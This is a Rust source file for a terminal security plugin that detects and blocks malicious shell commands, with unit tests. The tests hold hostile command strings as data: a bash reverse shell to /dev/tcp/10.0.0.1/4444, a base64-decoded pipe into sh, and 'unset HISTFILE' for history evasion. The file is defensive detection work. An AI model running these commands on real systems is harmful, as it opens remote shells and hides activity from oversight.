//! Suspicious Pattern Detection Plugin
//!
//! Detects malicious command patterns:
//! - Reverse shells (bash, nc, python, perl, ruby, php)
//! - Encoded command execution (base64, hex)
//! - Download and execute patterns
//! - History evasion techniques

use async_trait::async_trait;
use masterm_core::plugin::{
    ActivationTrigger, CommandAction, DetectionContext, Plugin, PluginActivation, PluginContext,
    PluginError, PluginManifest, PluginMeta, PluginPerformance, PluginPermissions,
    PluginRequirements, PromptContext,
};
use masterm_core::prompt::Segment;
use masterm_security::patterns::{ThreatCategory, ThreatMatch, ThreatPatternMatcher};

/// Suspicious Pattern Detection Plugin
pub struct SuspiciousPatternPlugin {
    manifest: PluginManifest,
    matcher: ThreatPatternMatcher,
    /// Allow bypass for security testing
    allow_bypass: bool,
    /// Block reverse shell attempts
    block_reverse_shells: bool,
    /// Block encoded command execution
    block_encoded_commands: bool,
}

impl SuspiciousPatternPlugin {
    pub fn new() -> Self {
        Self {
            manifest: PluginManifest {
                plugin: PluginMeta {
                    name: "suspicious-pattern".to_string(),
                    version: "1.0.0".to_string(),
                    description: "Detect malicious command patterns".to_string(),
                    author: "MASTerm Security Team".to_string(),
                    license: "MIT".to_string(),
                    homepage: Some("https://masterm.dev/plugins/suspicious-pattern".to_string()),
                },
                requirements: PluginRequirements::default(),
                permissions: PluginPermissions {
                    filesystem: vec![],
                    network: "none".to_string(),
                    environment: vec![],
                    execute: vec![],
                },
                activation: PluginActivation {
                    triggers: vec![ActivationTrigger::Always],
                    mode: "always".to_string(),
                },
                performance: PluginPerformance {
                    startup_cost: "low".to_string(),
                    runtime_cost: "low".to_string(),
                },
            },
            matcher: ThreatPatternMatcher::new(),
            allow_bypass: true,
            block_reverse_shells: true,
            block_encoded_commands: true,
        }
    }

    /// Format warning message for threats
    fn format_warning(&self, threats: &[ThreatMatch]) -> String {
        let mut msg = String::from("\x1b[1;33m⚠️  SUSPICIOUS COMMAND DETECTED\x1b[0m\n\n");

        for threat in threats {
            msg.push_str(&format!(
                "  {} \x1b[1m{}\x1b[0m\n",
                threat.category.icon(),
                threat.description
            ));
            msg.push_str(&format!("     Risk: {:?}\n", threat.risk_level));
        }

        if let Some(first) = threats.first() {
            msg.push_str(&format!("\n💡 {}\n", first.explanation));
        }

        msg
    }

    /// Format block message for critical threats
    fn format_block(&self, threats: &[ThreatMatch]) -> String {
        let mut msg = String::from("\x1b[1;31m🚨 MALICIOUS COMMAND BLOCKED\x1b[0m\n\n");

        for threat in threats {
            msg.push_str(&format!(
                "  {} \x1b[1;31m{}\x1b[0m\n",
                threat.category.icon(),
                threat.description
            ));
        }

        msg.push_str("\n\x1b[31mThis command matches a known attack pattern.\x1b[0m\n");

        if self.allow_bypass {
            msg.push_str("\nIf this is intentional (e.g., security testing), use:\n");
            msg.push_str("  \x1b[1mmasterm security bypass --reason \"<reason>\"\x1b[0m\n");
        }

        msg
    }

    /// Format confirmation message
    fn format_confirmation(&self, threats: &[ThreatMatch]) -> String {
        let mut msg = self.format_warning(threats);
        msg.push_str(
            "\nType '\x1b[1;32myes\x1b[0m' to proceed or '\x1b[1;31mno\x1b[0m' to cancel:",
        );
        msg
    }

    /// Determine action based on threat
    fn determine_action(&self, threats: &[ThreatMatch]) -> CommandAction {
        // Check for blocking threats
        let has_blocking_threat = threats.iter().any(|t| {
            t.should_block
                && match t.category {
                    ThreatCategory::ReverseShell => self.block_reverse_shells,
                    ThreatCategory::EncodedExecution => self.block_encoded_commands,
                    ThreatCategory::SystemDestruction => true,
                    _ => false,
                }
        });

        if has_blocking_threat {
            return CommandAction::Block(self.format_block(threats));
        }

        // Non-blocking threats get confirmation
        CommandAction::Confirm(self.format_confirmation(threats))
    }
}

impl Default for SuspiciousPatternPlugin {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl Plugin for SuspiciousPatternPlugin {
    fn manifest(&self) -> &PluginManifest {
        &self.manifest
    }

    async fn init(&mut self, ctx: &PluginContext) -> Result<(), PluginError> {
        if let Some(allow) = ctx.get_config_bool("allow_bypass") {
            self.allow_bypass = allow;
        }
        if let Some(block) = ctx.get_config_bool("block_reverse_shells") {
            self.block_reverse_shells = block;
        }
        if let Some(block) = ctx.get_config_bool("block_encoded_commands") {
            self.block_encoded_commands = block;
        }
        Ok(())
    }

    fn should_activate(&self, _ctx: &DetectionContext) -> bool {
        true
    }

    async fn segments(&self, _ctx: &PromptContext) -> Result<Vec<Segment>, PluginError> {
        Ok(vec![])
    }

    fn on_command(&self, cmd: &str) -> CommandAction {
        let threats = self.matcher.find_all(cmd);

        if threats.is_empty() {
            return CommandAction::Allow;
        }

        self.determine_action(&threats)
    }

    async fn cleanup(&mut self) -> Result<(), PluginError> {
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_reverse_shell_detection() {
        let plugin = SuspiciousPatternPlugin::new();

        let action = plugin.on_command("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1");
        assert!(matches!(action, CommandAction::Block(_)));
    }

    #[test]
    fn test_encoded_command_detection() {
        let plugin = SuspiciousPatternPlugin::new();

        let action = plugin.on_command("echo 'test' | base64 -d | sh");
        assert!(matches!(action, CommandAction::Block(_)));
    }

    #[test]
    fn test_normal_command_allowed() {
        let plugin = SuspiciousPatternPlugin::new();

        let action = plugin.on_command("ls -la");
        assert!(matches!(action, CommandAction::Allow));

        let action = plugin.on_command("git push origin main");
        assert!(matches!(action, CommandAction::Allow));
    }

    #[test]
    fn test_history_evasion_warning() {
        let plugin = SuspiciousPatternPlugin::new();

        let action = plugin.on_command("unset HISTFILE");
        // History evasion should trigger confirmation, not block
        assert!(matches!(action, CommandAction::Confirm(_)));
    }
}
